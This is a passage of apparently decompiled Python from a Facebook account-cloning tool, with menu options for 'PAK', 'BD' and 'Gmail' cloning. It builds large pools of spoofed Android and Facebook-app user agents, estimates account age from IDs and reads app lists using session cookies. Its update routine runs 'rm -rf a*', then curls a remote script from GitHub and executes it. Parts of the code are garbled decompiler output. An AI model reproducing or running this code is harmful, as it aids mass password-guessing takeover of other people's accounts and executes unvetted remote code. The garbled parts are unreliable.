    aa = 'Mozilla/5.0 (Linux; U; Android 2.2;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'fr-fr; Desire_A8181 Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = ' 4.0 Mobile Safari/533.1'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (SMART-TV;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'Linux; Tizen 2.4.0)'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/538.1'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; U; Android 2.3.6;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'fr-fr; GT-S5839i Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = ' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '4.0 Mobile Safari/534.30'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 4.0.4;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'LT30p Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = '7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '18.0.1025.166 Mobile Safari/535.19'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'CPH1969 Build/RP1A.200720.011; wv)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 7.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 4 Build/NRD90M)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/63.0.3239.111 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 9 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 9 Pro)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'ASUS_I005DA)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/102.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Vivo Y91C)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/98.0.4711.185 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'M2012K11AG Build/'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Vivo Y91C)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/97.0.4740.200 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'CPH1909 Build/O11019 )'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    
    def tahunng(fx):
        if len(fx) == 15:
            if fx[:10] in ('1000000000',):
                tahunz = '2009'
            if fx[:9] in ('100000000',):
                tahunz = '2009'
            if fx[:8] in ('10000000',):
                tahunz = '2009'
            if fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
                tahunz = '2009'
            if fx[:7] in ('1000006', '1000007', '1000008', '1000009'):
                tahunz = '2010'
            if fx[:6] in ('100001',):
                tahunz = '2010-2011'
            if fx[:6] in ('100002', '100003'):
                tahunz = '2011-2012'
            if fx[:6] in ('100004',):
                tahunz = '2012-2013'
            if fx[:6] in ('100005', '100006'):
                tahunz = '2013-2014'
            if fx[:6] in ('100007', '100008'):
                tahunz = '2014-2015'
            if fx[:6] in ('100009',):
                tahunz = '2015'
            if fx[:5] in ('10001',):
                tahunz = '2015-2016'
            if fx[:5] in ('10002',):
                tahunz = '2016-2017'
            if fx[:5] in ('10003',):
                tahunz = '2018'
            if fx[:5] in ('10004',):
                tahunz = '2019'
            if fx[:5] in ('10005',):
                tahunz = '2020'
            if fx[:5] in ('10006', '10007', '10008'):
                tahunz = '2021-2022'
            tahunz = ''
        if len(fx) in (9, 10):
            tahunz = '2008-2009'
        if len(fx) == 8:
            tahunz = '2007-2008'
        if len(fx) == 7:
            tahunz = '2006-2007'
        tahunz = ''
        return tahunz

    
    def lo(word):
        heron = [
            '[\x1b[1;91m■\x1b[0m□□□□□□□□□]',
            '[\x1b[1;92m■■\x1b[0m□□□□□□□□]',
            '[\x1b[1;93m■■■\x1b[0m□□□□□□□]',
            '[\x1b[1;94m■■■■\x1b[0m□□□□□□]',
            '[\x1b[1;95m■■■■■\x1b[0m□□□□□]',
            '[\x1b[1;96m■■■■■■\x1b[0m□□□□]',
            '[\x1b[1;97m■■■■■■■\x1b[0m□□□]',
            '[\x1b[1;98m■■■■■■■■\x1b[0m□□]',
            '[\x1b[1;99m■■■■■■■■■\x1b[0m□]',
            '[\x1b[1;910m■■■■■■■■■■\x1b[0m]']
        for i in range(7):
            for x in range(len(heron)):
                sys.stdout.write('\r{}{}'.format(str(word), heron[x]))
                time.sleep(0.1)
                sys.stdout.flush()
                return None

    agent = {
        'Mozilla/5.0 (Linux; Android 13; PDEM10 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 12; zh-CN; PDEM10 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.7.3.1154 Mobile Safari/537.36'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 12; zh-CN; PDEM10 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Quark/6.4.2.330 Mobile Safari/537.36'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920]'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 11; vivo 1901 Build/RP1A.200720.012)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 7.1.2; Redmi 4 MIUI/V10.1.1.0.NAMMIFI)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-J337P Build/R16NW)'}
    agent = {
        ' Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-J337W Build/R16NW)'}
    agent = {
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 7.1.2; YAL-AL10 Build/N2G47O)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X680 Build/QP1A.190711.020)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'}
    agent = {
        'Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 8.1.0;CPH1803 Build/OPM1.171019.026)[FBAN/Orca- Android;FBAV/275.0.0.20.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/234764319;FBCR/TNT;FBMF/OPPO;FBDV/CPH1803;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'}
    agent = {
        'Dalvik/1.6.0 (Linux; U; Android 4.0.4; T970 Build/IMM76D)100.48.122; Profile/MIDP-2.1 Configuration/'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)'}
    agent = {
        'Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)'}
    agent = {
        'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.4.4; sk-sk; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30'}
    agent = {
        'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'}
    agent = {
        'WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)'}
    agent = {
        'WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)'}
    agent = {
        'WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)'}
    agent = {
        'Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA'}
    logo = '\n\x1b[1;32m   ###    ##     ## ##     ## ######## ########  \n\x1b[1;32m  ## ##   ##     ## ###   ### ##       ##     ## \n\x1b[1;32m ##   ##  ##     ## #### #### ##       ##     ## \n\x1b[1;32m##     ## ######### ## ### ## ######   ##     ## \n\x1b[1;32m######### ##     ## ##     ## ##       ##     ## \n\x1b[1;32m##     ## ##     ## ##     ## ##       ##     ## \n\x1b[1;32m##     ## ##     ## ##     ## ######## ########\n                                          XD\x1b[1;37m \n\x1b[1;92m__________________________________________________\n \x1b[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \x1b[1;31mAUTHOR:MR: AHMED\x1b[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         \n──────────────────────────────────────────────────\n\x1b[1;37m[•] AUTHOR     : \x1b[1;32mAHMED x DANI\x1b[1;37m\n\x1b[1;37m[•] YT CHANNEL     : \x1b[1;32mPRIVATE\x1b[1;37m\n\x1b[1;37m[•] TOOL NAME  : \x1b[1;32mXD\x1b[1;37m\n\x1b[1;37m[•] STATUS     : \x1b[1;32m(ACTIVE)\x1b[1;37m\n\x1b[1;92m──────────────────────────────────────────────────\n[•] \x1b[1;34mVERSION    :\x1b[1;32m 2.3\x1b[1;37m\n\x1b[1;92m──────────────────────────────────────────────────'
    
    def lines():
        print('\x1b[1;92m──────────────────────────────────────────────────')

    loop = 0
    oks = []
    cps = []
    print('\n\x1b[1;37m[•] WAIT CHECKING FOR UPDATE')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
print('\n\x1b[1;31mNo internet connection ... \x1b[0;97m')

def dynamic(text):
    titik = [
        '.   ',
        '..  ',
        '... ',
        '.... ']
    for o in titik:
        (print('\r' + text + o),)
        sys.stdout.flush()
        time.sleep(1)
        return None


def cek_apk(session, coki):
    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
        'cookie': coki }).text
    sop = BeautifulSoup(w, 'html.parser')
    x = sop.find('form', method = 'post')
    game = x.find_all('h3')()
    if len(game) == 0:
        print(f'''\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK''')
    print('')
    print('\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :' % H)
    for i in range(len(game)):
        print(f'''{H!s}{i + 1!s}. {game[i].replace('ACTIVE', ' ACTIVE')!s}{N!s}''')
        w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
            'cookie': coki }).text
        sop = BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method = 'post')
        game = x.find_all('h3')()
        if len(game) == 0:
            print(f'''\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK''')
            return None
        (lambda .0: for i in .0:
[ i.text ])('\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :' % M)
        for i in range(len(game)):
            print(f'''{K!s}{i + 1!s}. {game[i].replace('Expired', ' Expired')!s}{N!s}''')
            return None


def Main():
    os.system('clear')
    print(logo)
    print('[1] RANDOM PAK CLONING')
    print('[2] RANDOM BD CLONING')
    print('[3] RANDOM CHOICE PASS CLONING')
    print('[4] GMAIL CLONING')
    print('[0] EXIT')
    lines()
    gh = input('[•] CHOOSE : ')
    if gh == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085482740170/')
        menu()
        return None
